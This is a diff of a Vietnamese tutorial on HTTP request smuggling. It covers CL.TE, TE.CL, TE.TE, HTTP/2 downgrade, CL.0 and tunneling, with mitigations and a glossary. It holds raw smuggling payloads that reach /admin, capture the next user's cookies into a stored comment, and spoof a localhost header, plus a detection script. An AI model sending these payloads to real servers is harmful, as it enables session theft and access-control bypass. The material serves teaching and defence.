@@ -1,16 +1,15 @@
 # HTTP Request Smuggling
 
-> **OWASP Top 10:2025**: A08 | **CWE**: CWE-444 | **Nguồn**: PortSwigger, RFC 7230, James Kettle Research
+> **CWE**: CWE-444 | **Phân loại**: Data Integrity
 
-## 🧱 Kiến thức Nền tảng
+## Kiến thức Nền tảng
+Hãy tưởng tượng hệ thống web hiện đại giống như một chuỗi nhà hàng thức ăn nhanh hoạt động hết công suất. Khi bạn gửi yêu cầu (request), yêu cầu đó không đi thẳng tới người đầu bếp (Back-end Server) ngay lập tức. Thay vào đó, nó phải đi qua một người thu ngân ở quầy (Front-end Proxy/Load Balancer/CDN). Để tiết kiệm thời gian và tăng tốc phục vụ, người thu ngân thường gom nhiều yêu cầu từ các khách hàng khác nhau lại và gửi chung qua một đường truyền duy nhất (kỹ thuật gọi là tái sử dụng kết nối - connection reuse).
 
-Trong kiến trúc web hiện đại, request của người dùng thường đi qua nhiều lớp: **CDN → Load Balancer → Reverse Proxy → Application Server**. Các lớp này giao tiếp bằng giao thức HTTP, và để tối ưu hiệu suất, chúng thường sử dụng **connection reuse** (tái sử dụng kết nối) — nhiều HTTP request được gửi qua cùng một TCP connection.
+Để đầu bếp và thu ngân có thể hiểu nhau, họ phải dùng chung một giao thức (HTTP/1.1) với hai cách để đo lường độ dài của một đơn hàng:
+- **Content-Length (CL)**: Giống như dán nhãn ghi rõ "Gói hàng này nặng đúng 13 gram (byte)".
+- **Transfer-Encoding (TE)**: Giống như chia nhỏ món ăn ra gửi đi từng phần (chunked), và báo hiệu hết hàng bằng một phần có kích thước bằng 0.
 
-Giao thức HTTP/1.1 có hai cơ chế xác định ranh giới giữa các request:
-- **Content-Length (CL)**: chỉ định số byte trong body
-- **Transfer-Encoding (TE)**: sử dụng chunked encoding, body được chia thành các chunk
-
-Theo RFC 7230, khi cả hai header cùng xuất hiện, `Transfer-Encoding` phải được ưu tiên. Tuy nhiên, trên thực tế, mỗi server xử lý khác nhau — tạo ra sự không đồng nhất (**desync**) giữa front-end và back-end.
+Về mặt lý thuyết (theo chuẩn RFC 7230), nếu một yêu cầu có cả hai nhãn trên, phía nhận bắt buộc phải ưu tiên xử lý theo cách chia nhỏ (Transfer-Encoding). Nhưng thực tế phũ phàng hơn nhiều: mỗi máy chủ lại xử lý một kiểu! Sự không đồng nhất (desync) giữa người thu ngân phía trước và người đầu bếp phía sau chính là nguồn cơn của lỗ hổng.
 
 ```
 # Normal HTTP/1.1 request flow through proxy chain
@@ -42,108 +41,96 @@ d\r\n
 \r\n
 ```
 
-## 🔍 Mô tả lỗ hổng
+## Mô tả lỗ hổng
+Lỗ hổng **HTTP Request Smuggling (Buôn lậu yêu cầu HTTP)** xuất hiện chính từ sự thiếu đồng bộ kể trên. Hãy hình dung kẻ tấn công như một vị khách tinh quái. Hắn chuẩn bị một đơn hàng "siêu đặc biệt" kết hợp cả hai nhãn CL và TE để lừa hệ thống. Người thu ngân phía trước đọc nhãn CL, thấy độ dài hợp lý nên cho đi qua. Nhưng khi đến tay đầu bếp ở phía sau, do ưu tiên đọc nhãn TE, ông ấy dừng lại giữa chừng vì tưởng đơn hàng đã hết. Phần đuôi còn thừa của đơn hàng đó vẫn nằm vất vưởng trên băng chuyền.
 
-HTTP Request Smuggling xảy ra khi front-end proxy và back-end server không thống nhất về cách phân tách ranh giới request. Kẻ tấn công gửi một request được thiết kế đặc biệt, khiến một phần của request bị "nhét" (smuggle) vào đầu request tiếp theo — có thể là request của **người dùng khác**.
+Khi bạn – một người dùng vô tội tiếp theo – đến quầy gửi yêu cầu của mình, phần đuôi "bị buôn lậu" trước đó của kẻ tấn công sẽ tự động dán chặt vào đầu yêu cầu của bạn. Kết quả là hệ thống xử lý yêu cầu của bạn nhưng lại thực hiện hành động mà kẻ tấn công đã cài cắm từ trước.
 
-Có ba biến thể chính:
-- **CL.TE**: Front-end dùng Content-Length, back-end dùng Transfer-Encoding
-- **TE.CL**: Front-end dùng Transfer-Encoding, back-end dùng Content-Length
-- **TE.TE**: Cả hai dùng Transfer-Encoding nhưng xử lý obfuscation khác nhau
+Lỗ hổng này cực kỳ nguy hiểm bởi vì nó có thể giúp kẻ tấn công:
+- Vượt qua các hệ thống kiểm soát an ninh (WAF).
+- Chiếm đoạt phiên làm việc (session) hoặc thông tin cá nhân của người dùng khác khi họ vô tình truy cập ngay sau đó.
+- Làm nhiễm độc bộ nhớ đệm (cache poisoning), khiến mọi người dùng khác đều nhận được nội dung độc hại.
+- Lẻn vào các giao diện quản trị nội bộ mà bình thường họ không thể tiếp cận.
 
-Hậu quả bao gồm: bypass WAF, chiếm session người dùng, cache poisoning, và truy cập endpoint nội bộ.
+## Cơ chế tấn công
+**1. Các Biến thể HTTP/1.1 Desync Cơ bản:**
 
-## ⚔️ Cơ chế tấn công
+- **CL.TE Attack (Front-end dùng CL, back-end dùng TE)**:
+  ```http
+  # CL.TE smuggling: front-end reads 6 bytes, back-end uses chunked
+  POST / HTTP/1.1
+  Host: vulnerable.com
+  Content-Length: 6
+  Transfer-Encoding: chunked
 
-**CL.TE Attack — Front-end dùng CL, back-end dùng TE:**
+  0\r\n
+  \r\n
+  G
+  ```
+  *Giải thích*: Front-end đọc 6 byte (tới chữ `G`) và forward toàn bộ. Back-end sử dụng chunked nên dừng đọc ở chunk `0\r\n\r\n` (hết body). Ký tự thừa `G` còn lại trong socket buffer sẽ được coi là ký tự bắt đầu của request tiếp theo (ví dụ biến thành `GGET / HTTP/1.1`).
 
-```http
-# CL.TE smuggling: front-end reads 6 bytes, back-end uses chunked
-POST / HTTP/1.1
-Host: vulnerable.com
-Content-Length: 6
-Transfer-Encoding: chunked
+- **TE.CL Attack (Front-end dùng TE, back-end dùng CL)**:
+  ```http
+  # TE.CL smuggling: smuggle a request to access /admin
+  POST / HTTP/1.1
+  Host: vulnerable.com
+  Content-Length: 4
+  Transfer-Encoding: chunked
 
-0\r\n
-\r\n
-G
-```
+  5c\r\n
+  GPOST /admin HTTP/1.1\r\n
+  Host: vulnerable.com\r\n
+  Content-Length: 15\r\n
+  \r\n
+  x=1\r\n
+  0\r\n
+  \r\n
+  ```
+  *Giải thích*: Front-end sử dụng chunked nên đọc toàn bộ dữ liệu tới chunk `0`. Back-end chỉ sử dụng `Content-Length: 4`, do đó chỉ đọc 4 byte đầu tiên (`5c\r\n`). Phần còn lại bắt đầu từ `GPOST...` bị bỏ lại trong bộ đệm và ghép vào request tiếp theo.
 
-```
-# What happens:
-# Front-end sees Content-Length: 6 → forwards "0\r\n\r\nG" as the body
-# Back-end sees Transfer-Encoding: chunked → reads chunk "0" (end of body)
-# The leftover "G" becomes the START of the next request: "GPOST /admin ..."
-# This poisons the next user's request!
-```
+- **TE.TE Attack (Obfuscation Transfer-Encoding)**:
+  ```http
+  POST / HTTP/1.1
+  Host: vulnerable.com
+  Content-Length: 4
+  Transfer-Encoding: chunked
+  Transfer-Encoding: xobfuscate     # Một trong các server bỏ qua dòng này
+  ```
+  *Giải thích*: Cả hai server đều hỗ trợ `Transfer-Encoding`, nhưng kẻ tấn công làm xáo trộn (obfuscate) header này sao cho chỉ một trong hai server nhận diện được, còn server kia bỏ qua và sử dụng `Content-Length`. Hệ quả là đưa cuộc tấn công về dạng CL.TE hoặc TE.CL.
 
-**TE.CL Attack — Front-end dùng TE, back-end dùng CL:**
+**2. Chiếm request của người dùng khác (Request Capture):**
+  ```http
+  # Smuggle a request that captures the next user's request into a stored field
+  POST / HTTP/1.1
+  Host: vulnerable.com
+  Content-Length: 130
+  Transfer-Encoding: chunked
 
-```http
-# TE.CL smuggling: smuggle a request to access /admin
-POST / HTTP/1.1
-Host: vulnerable.com
-Content-Length: 4
-Transfer-Encoding: chunked
+  0
 
-5c\r\n
-GPOST /admin HTTP/1.1\r\n
-Host: vulnerable.com\r\n
-Content-Length: 15\r\n
-\r\n
-x=1\r\n
-0\r\n
-\r\n
-```
+  POST /store-comment HTTP/1.1
+  Host: vulnerable.com
+  Content-Length: 800
+  Content-Type: application/x-www-form-urlencoded
 
-**TE.TE — Obfuscation để chỉ một bên nhận TE:**
+  comment=
+  ```
+  *Giải thích*: Phần request thứ hai (`POST /store-comment`) bị smuggle và đợi ở buffer. Khi người dùng tiếp theo gửi request, nó sẽ được ghép trực tiếp sau tham số `comment=`. Kết quả là toàn bộ request (chứa Cookie, Authorization header) của người dùng đó bị ghi đè vào comment và lưu trữ lại trên server để kẻ tấn công đọc được.
 
-```http
-# TE.TE with obfuscation — one server ignores the malformed header
-POST / HTTP/1.1
-Host: vulnerable.com
-Content-Length: 4
-Transfer-Encoding: chunked
-Transfer-Encoding: cow            # Obfuscated — some servers ignore this
-Transfer-Encoding : chunked       # Extra space before colon
-Transfer-Encoding: chunked
-Transfer-encoding: x              # Lowercase 'e' variant
+**3. HTTP/2 Downgrade Smuggling (H2.CL và H2.TE):**
+  - **Cơ chế**: Nhiều proxy front-end nhận request HTTP/2 từ client nhưng chuyển đổi hạ cấp (downgrade) thành HTTP/1.1 trước khi chuyển tiếp cho back-end. Do HTTP/2 là giao thức nhị phân và xác định độ dài request bằng các frame dữ liệu nên nó không cần đến các header xác định ranh giới. Tuy nhiên, kẻ tấn công có thể chèn thủ công các header `content-length` hoặc `transfer-encoding` vào HTTP/2 request. Front-end proxy thường bỏ qua các header này vì đã có frame nhị phân, nhưng khi downgrade sang HTTP/1.1, proxy lại đính kèm các header này vào request gửi tới back-end, gây ra sự bất đồng bộ (desync) ở back-end.
+  - **H2.CL Attack**: Kẻ tấn công gửi request HTTP/2 chứa header `content-length` giả mạo. Sau khi downgrade, back-end HTTP/1.1 xử lý request dựa trên `content-length` này, dẫn đến bỏ sót một phần request body trong buffer để ghép vào request sau.
+  - **H2.TE Attack**: Kẻ tấn công gửi request HTTP/2 chứa header `transfer-encoding: chunked`. Khi chuyển sang HTTP/1.1, back-end server ưu tiên xử lý dạng chunked, gây desync với luồng dữ liệu mà front-end đã gửi.
 
-5c\r\n
-GPOST /admin HTTP/1.1\r\n
-Host: vulnerable.com\r\n
-\r\n
-0\r\n
-\r\n
-```
+**4. CL.0 Attacks (Content-Length 0):**
+  - **Cơ chế**: Xảy ra khi front-end proxy chuyển tiếp request body và sử dụng header `Content-Length` bình thường, nhưng back-end server lại cấu hình để bỏ qua body của một số request (ví dụ như các API GET hoặc POST cụ thể) và mặc định coi độ dài body bằng `0`.
+  - **Tấn công**: Kẻ tấn công gửi một POST request chứa dữ liệu bổ sung trong body và chỉ định `Content-Length` chính xác. Front-end forward toàn bộ request này. Back-end nhận request, nhưng vì nó coi độ dài body bằng `0` nên xử lý ngay lập tức và coi phần body thực tế của request đó là sự khởi đầu của request tiếp theo được gửi trên cùng kết nối TCP.
 
-**Chiếm request của người dùng khác:**
+**5. Request Tunneling (Đào hầm yêu cầu qua Proxy):**
+  - **Cơ chế**: Kẻ tấn công lợi dụng sự desync giữa proxy và back-end để đóng gói một request hoàn chỉnh khác bên trong phần thân của request đầu tiên (smuggled request).
+  - Request này được "tunnel" qua proxy mà hoàn toàn không bị kiểm tra bởi các chính sách bảo mật, bộ lọc IP, xác thực hay WAF được cài đặt trên proxy front-end. Back-end server khi đọc luồng dữ liệu từ socket sẽ phân tách yêu cầu bị chèn này và thực thi nó dưới tư cách là một yêu cầu nội bộ hợp lệ, cho phép kẻ tấn công truy cập trái phép các endpoint nhạy cảm (như `/admin`, `/internal-api`) hoặc giả mạo người dùng nội bộ.
 
-```http
-# Smuggle a request that captures the next user's request into a stored field
-POST / HTTP/1.1
-Host: vulnerable.com
-Content-Length: 130
-Transfer-Encoding: chunked
-
-0
-
-POST /store-comment HTTP/1.1
-Host: vulnerable.com
-Content-Length: 800
-Content-Type: application/x-www-form-urlencoded
-
-comment=
-# The next user's ENTIRE request (including cookies, auth headers)
-# gets appended to the "comment" parameter and stored!
-```
-
-## 🛡️ Biện pháp phòng thủ
-
-1. **Sử dụng HTTP/2 end-to-end** — HTTP/2 dùng binary framing, loại bỏ hoàn toàn ambiguity về ranh giới request. Đảm bảo không downgrade sang HTTP/1.1 ở back-end.
-
-2. **Cấu hình proxy từ chối request ambiguous** — reject request có cả `Content-Length` và `Transfer-Encoding`:
-
+## Biện pháp phòng thủ
 ```nginx
 # Nginx — reject ambiguous requests
 if ($http_transfer_encoding ~* "chunked" ) {
@@ -158,14 +145,16 @@ if ($ambiguous = "TECL") {
 }
 ```
 
-3. **Normalize header** trước khi forward — strip duplicate `Transfer-Encoding`, loại bỏ obfuscation.
+- **Tóm tắt**: Phòng chống HTTP Request Smuggling bằng cách sử dụng HTTP/2 end-to-end, cấu hình proxy từ chối request không rõ ràng, và chuẩn hóa các HTTP header.
+- **Các bước chi tiết**:
+  - **Sử dụng HTTP/2 end-to-end** — HTTP/2 dùng binary framing, loại bỏ hoàn toàn ambiguity về ranh giới request. Đảm bảo không downgrade sang HTTP/1.1 ở back-end.
+  - **Cấu hình proxy từ chối request ambiguous** — reject request có cả `Content-Length` và `Transfer-Encoding`:
+  - **Normalize header** trước khi forward — strip duplicate `Transfer-Encoding`, loại bỏ obfuscation.
+  - **Mỗi request một TCP connection** — tắt connection reuse giữa front-end và back-end (giảm hiệu suất nhưng an toàn).
+  - **Sử dụng công cụ kiểm tra** — Burp Suite's HTTP Request Smuggler extension để phát hiện vulnerability.
 
-4. **Mỗi request một TCP connection** — tắt connection reuse giữa front-end và back-end (giảm hiệu suất nhưng an toàn).
-
-5. **Sử dụng công cụ kiểm tra** — Burp Suite's HTTP Request Smuggler extension để phát hiện vulnerability.
-
-## 💻 Code Example
-
+## Code Example
+### 1. HTTP/1.1 CL.TE Smuggling Detection Script (Python)
 ```python
 # === DETECTION SCRIPT: Detect CL.TE smuggling vulnerability ===
 import socket
@@ -196,22 +185,96 @@ def test_cl_te(host, port=80):
         print("[VULN] Timeout detected — possible CL.TE smuggling!")
     finally:
         sock.close()
-
-# === SECURE: Express.js middleware to reject ambiguous requests ===
-# const express = require('express');
-# app.use((req, res, next) => {
-#     const hasCL = req.headers['content-length'] !== undefined;
-#     const hasTE = req.headers['transfer-encoding'] !== undefined;
-#     if (hasCL && hasTE) {
-#         // Reject requests with both Content-Length and Transfer-Encoding
-#         return res.status(400).send('Ambiguous request rejected');
-#     }
-#     next();
-# });
 ```
 
-## 📚 Nguồn tham khảo
+### 2. HTTP/2 Downgrade Smuggling Payload
+```http
+# === CLIENT HTTP/2 REQUEST (Sent via H2 Frame) ===
+# Attacker injects custom transfer-encoding/content-length headers into the binary frame
+:method: POST
+:path: /
+:authority: vulnerable.com
+content-length: 0
+transfer-encoding: chunked
+
+# === DOWNGRADED HTTP/1.1 REQUEST (Forwarded by Front-end) ===
+# The front-end proxy converts H2 to HTTP/1.1, appending the injected headers
+POST / HTTP/1.1
+Host: vulnerable.com
+Content-Length: 0
+Transfer-Encoding: chunked
+
+5\r\n
+SMUGL\r\n
+0\r\n
+\r\n
+```
+
+### 3. CL.0 Smuggling Payload
+```http
+# === VULNERABLE CL.0 REQUEST ===
+# Front-end reads Content-Length: 44. Back-end ignores body, treating length as 0.
+POST /index.html HTTP/1.1
+Host: vulnerable.com
+Content-Length: 44
+
+GET /admin HTTP/1.1
+Host: vulnerable.com
+```
+
+### 4. Request Tunneling Payload
+```http
+# === SMUGGLED TUNNEL REQUEST ===
+# The smuggled payload encapsulates a complete GET request to bypass front-end controls
+POST / HTTP/1.1
+Host: vulnerable.com
+Content-Length: 120
+Transfer-Encoding: chunked
+
+0\r\n
+\r\n
+GET /admin HTTP/1.1\r\n
+Host: vulnerable.com\r\n
+X-Forwarded-For: 127.0.0.1\r\n
+\r\n
+```
+
+### 5. Secure Nginx Proxy Configuration
+```nginx
+# === SECURE: Force HTTP/2 end-to-end to prevent downgrade vulnerabilities ===
+server {
+    listen 443 ssl;
+    http2 on;
+    
+    location / {
+        # Normalize and reject ambiguous headers from client requests
+        # Use HTTP/2 protocol for communication with back-end to eliminate translation mismatches
+        proxy_pass https://backend_servers;
+        proxy_http_version 2.0; 
+    }
+}
+```
+
+## Xem thêm
+- [Các bài học liên quan trong cùng thư mục](../)
+
+## Nguồn tham khảo
 - PortSwigger: https://portswigger.net/web-security/request-smuggling
 - OWASP: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/15-Testing_for_HTTP_Splitting_Smuggling
 - CWE: https://cwe.mitre.org/data/definitions/444.html
 - James Kettle: https://portswigger.net/research/http-desync-attacks
+
+## Giải thích thuật ngữ
+- **CDN (Content Delivery Network)**: Mạng lưới phân phối nội dung giúp tăng tốc độ tải trang bằng cách lưu trữ bản sao ở nhiều nơi trên thế giới gần với người dùng hơn.
+- **Load Balancer**: Bộ cân bằng tải, phân chia lưu lượng truy cập đều cho các máy chủ phía sau để tránh quá tải.
+- **Reverse Proxy**: Máy chủ trung gian đứng trước các máy chủ ứng dụng để tiếp nhận, xử lý hoặc lọc yêu cầu từ client trước khi gửi vào hệ thống nội bộ.
+- **Application Server**: Máy chủ ứng dụng xử lý logic nghiệp vụ chính của website (như xử lý database, đăng nhập, mua hàng...).
+- **Connection Reuse**: Kỹ thuật tái sử dụng một kết nối mạng (TCP) để gửi nhiều yêu cầu liên tiếp nhằm tiết kiệm thời gian thiết lập kết nối mới.
+- **TCP Connection**: Kết nối mạng tin cậy giúp truyền dữ liệu ổn định và chính xác giữa hai máy tính.
+- **RFC**: Bộ tài liệu tiêu chuẩn kỹ thuật quy định các quy tắc hoạt động của các giao thức trên Internet.
+- **Desync (Mất đồng bộ)**: Sự không thống nhất về cách hiểu hoặc trạng thái dữ liệu giữa hai hay nhiều hệ thống khác nhau.
+- **WAF (Web Application Firewall)**: Tường lửa bảo vệ ứng dụng web khỏi các cuộc tấn công bằng cách lọc và giám sát lưu lượng HTTP.
+- **Cache Poisoning**: Kỹ thuật làm nhiễm độc bộ nhớ đệm, khiến hệ thống lưu trữ và trả về nội dung độc hại cho tất cả người dùng truy cập sau đó.
+- **Endpoint**: Điểm cuối (địa chỉ URL cụ thể) của một dịch vụ hoặc API mà ứng dụng có thể gửi yêu cầu đến.
+- **Obfuscation (Làm xáo trộn)**: Kỹ thuật làm mờ, biến đổi hoặc che giấu thông tin/dữ liệu để tránh bị các hệ thống quét an ninh phát hiện nhưng vẫn hoạt động được.
+- **Downgrade**: Quá trình hạ cấp giao thức hoặc phiên bản công nghệ xuống mức thấp hơn (ví dụ từ HTTP/2 xuống HTTP/1.1) nhằm mục đích tương thích ngược hoặc khai thác lỗi.
